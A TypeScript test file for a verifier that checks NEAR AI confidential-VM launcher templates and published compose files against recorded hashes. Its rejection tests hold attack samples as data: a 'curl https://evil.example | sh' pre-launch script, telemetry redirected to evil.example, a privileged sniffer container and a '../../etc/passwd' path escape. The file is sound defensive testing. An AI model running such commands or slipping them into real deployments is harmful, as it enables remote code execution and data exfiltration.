import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import test from "node:test";
import {
  DeploymentNotRecognised,
  NEAR_LAUNCHER_TEMPLATES,
  checkNearDeployment,
  launcherTemplateHash,
  sha256Hex,
  type DeploymentAction,
} from "./nearDeployment.ts";

const fixture = JSON.parse(readFileSync(new URL("./fixtures/near-glm-launcher.json", import.meta.url), "utf8")) as {
  appCompose: string;
  actions: DeploymentAction[];
};

const COMPOSE_BODY = "services:\n  model-proxy:\n    image: nearaidev/vllm-proxy-rs@sha256:" + "a".repeat(64) + "\n";
const COMMIT = "cb8318506040de6d8699d39c612a2c27c7b4601f";
const FILE = "prod/pack-glm-53-flash-pd2-long.yaml";

async function actionsWithFile(body = COMPOSE_BODY): Promise<DeploymentAction[]> {
  const [started] = fixture.actions;
  return [started, { action: "compose_up", commit: COMMIT, file: FILE, file_sha256: await sha256Hex(body), services: ["model-proxy"] }];
}

function editCompose(edit: (compose: string) => string, appCompose = fixture.appCompose): string {
  const config = JSON.parse(appCompose) as Record<string, unknown>;
  return JSON.stringify({ ...config, docker_compose_file: edit(String(config.docker_compose_file)) }, null, 4);
}

const fetchOk = (body = COMPOSE_BODY) => async (url: string) => {
  assert.equal(url, `https://raw.githubusercontent.com/nearai/cvm-compose-files/${COMMIT}/${FILE}`);
  return body;
};

async function reason(promise: Promise<unknown>): Promise<string> {
  try {
    await promise;
  } catch (error) {
    assert.ok(error instanceof DeploymentNotRecognised, String(error));
    return error.reason;
  }
  return "accepted";
}

test("NEAR's live launcher matches a known template", async () => {
  assert.ok((await launcherTemplateHash(fixture.appCompose)) in NEAR_LAUNCHER_TEMPLATES);
});

test("machine label, telemetry endpoint, dstack version and key order do not change the template", async () => {
  const base = await launcherTemplateHash(fixture.appCompose);
  let other = editCompose((c) =>
    c.replace(/INSTANCE_LABEL=[A-Za-z0-9._-]+/, "INSTANCE_LABEL=gpu99").split("https://telemetry.infra.near.ai").join("https://telemetry-stg.infra.near.ai")
  );
  other = other.replace(/dstack-nvidia-\d+\.\d+\.\d+/, "dstack-nvidia-0.5.99");
  const reordered = JSON.stringify(Object.fromEntries(Object.entries(JSON.parse(other) as object).reverse()));
  assert.equal(await launcherTemplateHash(reordered), base);
});

test("an attacker's own launcher on a genuine TDX machine is rejected", async () => {
  const cases = {
    extraService: editCompose((c) => `${c}\n  sniffer:\n    image: alpine@sha256:${"b".repeat(64)}\n    privileged: true\n`),
    otherManager: editCompose((c) => c.replace(/(COMPOSE_MANAGER_IMAGE:-nearaidev\/compose-manager@sha256:)[0-9a-f]{64}/, `$1${"c".repeat(64)}`)),
    otherScript: JSON.stringify({ ...(JSON.parse(fixture.appCompose) as object), pre_launch_script: "curl https://evil.example | sh" }),
    telemetryElsewhere: editCompose((c) => c.split("https://telemetry.infra.near.ai").join("https://evil.example")),
  };
  for (const [name, appCompose] of Object.entries(cases)) {
    assert.equal(await reason(checkNearDeployment({ appCompose, composeManager: { actions: await actionsWithFile() } }, { fetchText: fetchOk() })), "launcher_unknown", name);
  }
});

test("a published deployment file with the recorded hash passes, and is cached", async () => {
  const seen = new Set<string>();
  const cache = { has: (k: string) => seen.has(k), add: (k: string) => void seen.add(k) };
  const deployment = { appCompose: fixture.appCompose, composeManager: { actions: await actionsWithFile() } };
  const result = await checkNearDeployment(deployment, { fetchText: fetchOk(), cache });
  assert.deepEqual(result.composeFiles, [{ commit: COMMIT, file: FILE }]);
  let fetched = 0;
  await checkNearDeployment(deployment, { fetchText: async () => (fetched++, COMPOSE_BODY), cache });
  assert.equal(fetched, 0);
});

test("deployment files that are not NEAR's published ones are rejected", async () => {
  const deployment = { appCompose: fixture.appCompose, composeManager: { actions: await actionsWithFile() } };
  assert.equal(await reason(checkNearDeployment(deployment, { fetchText: fetchOk(COMPOSE_BODY + "# changed\n") })), "deployment_mismatch");
  assert.equal(
    await reason(checkNearDeployment(deployment, { fetchText: async () => Promise.reject(new Error("404")) })),
    "deployment_unpublished"
  );
});

test("a manager other than the template's, or no manager start, is rejected", async () => {
  const [started, ...rest] = await actionsWithFile();
  const swapped = [{ ...started, image: `nearaidev/compose-manager@sha256:${"d".repeat(64)}` }, ...rest];
  assert.equal(await reason(checkNearDeployment({ appCompose: fixture.appCompose, composeManager: { actions: swapped } }, { fetchText: fetchOk() })), "manager_mismatch");
  assert.equal(await reason(checkNearDeployment({ appCompose: fixture.appCompose, composeManager: { actions: rest } }, { fetchText: fetchOk() })), "manager_missing");
  assert.equal(await reason(checkNearDeployment({ appCompose: fixture.appCompose }, { fetchText: fetchOk() })), "manager_missing");
});

test("a deployment record without a commit, file and hash, or with a path escape, is rejected", async () => {
  const [started] = fixture.actions;
  for (const bad of [
    { action: "compose_up", commit: COMMIT, file: "../../etc/passwd", file_sha256: "e".repeat(64) },
    { action: "compose_up", commit: "main", file: FILE, file_sha256: "e".repeat(64) },
    { action: "compose_up", commit: COMMIT, file: FILE },
  ]) {
    assert.equal(
      await reason(checkNearDeployment({ appCompose: fixture.appCompose, composeManager: { actions: [started, bad] } }, { fetchText: fetchOk() })),
      "deployment_unreadable"
    );
  }
  assert.equal(
    await reason(checkNearDeployment({ appCompose: fixture.appCompose, composeManager: { actions: [started] } }, { fetchText: fetchOk() })),
    "deployment_missing"
  );
});

test("the live fixture's own deployment file is NEAR's published one", { skip: !process.env.NEAR_LIVE }, async () => {
  const result = await checkNearDeployment(
    { appCompose: fixture.appCompose, composeManager: { actions: fixture.actions } },
    { fetchText: async (url) => { const r = await fetch(url); if (!r.ok) throw new Error(String(r.status)); return r.text(); } }
  );
  assert.ok(result.composeFiles.length > 0);
});
